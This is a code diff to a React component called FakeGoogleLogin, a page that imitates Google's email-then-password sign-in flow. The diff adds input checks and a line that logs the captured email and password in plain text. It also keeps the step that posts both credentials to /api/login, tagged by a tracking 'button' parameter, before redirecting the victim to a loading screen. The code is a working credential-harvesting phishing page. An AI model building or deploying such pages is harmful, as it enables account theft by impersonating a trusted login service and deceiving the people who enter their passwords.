@@ -66,27 +66,35 @@ const FakeGoogleLogin = () => {
   const location = useLocation();
   const queryParams = new URLSearchParams(location.search);
   const button = queryParams.get('button') || 'unknown';
-  console.log('Button:', button);
 
-  const handleNext = async () => {
-    if (step === 'email') {
+  const handleNext = async (currentEmail, currentPassword, currentStep) => {
+    if (currentStep === 'email') {
+      if (!currentEmail) {
+        alert('Please enter your email');
+        return;
+      }
       setStep('password');
     } else {
-        // Always send email and password when the form is submitted (after both steps)
-        try {
-          const response = await fetch('/api/login', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ email, password, button: `google-${button}` }),
-          });
-          const data = await response.json();
-          console.log('Server response:', data);
-        } catch (error) {
-          console.error('Error sending login data:', error);
-        }
-        navigate('/loading');
+      if (!currentPassword) {
+        alert('Please enter your password');
+        return;
+      }
+      // Send email and password when the form is submitted
+      console.log(`Button: ${button}, Email: ${currentEmail}, Password: ${currentPassword}`);
+      try {
+        const response = await fetch('/api/login', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ email: currentEmail, password: currentPassword, button: `google-${button}` }),
+        });
+        const data = await response.json();
+        console.log('Server response:', data);
+      } catch (error) {
+        console.error('Error sending login data:', error);
+      }
+      navigate('/loading');
     }
   };
 
@@ -108,7 +116,7 @@ const FakeGoogleLogin = () => {
               onChange={(e) => setEmail(e.target.value)}
             />
             <ButtonContainer>
-              <Button onClick={handleNext}>Next</Button>
+              <Button onClick={() => handleNext(email, password, step)}>Next</Button>
             </ButtonContainer>
           </>
         ) : (
@@ -122,7 +130,7 @@ const FakeGoogleLogin = () => {
               onChange={(e) => setPassword(e.target.value)}
             />
             <ButtonContainer>
-              <Button onClick={handleNext}>Next</Button>
+              <Button onClick={() => handleNext(email, password, step)}>Next</Button>
             </ButtonContainer>
           </>
         )}
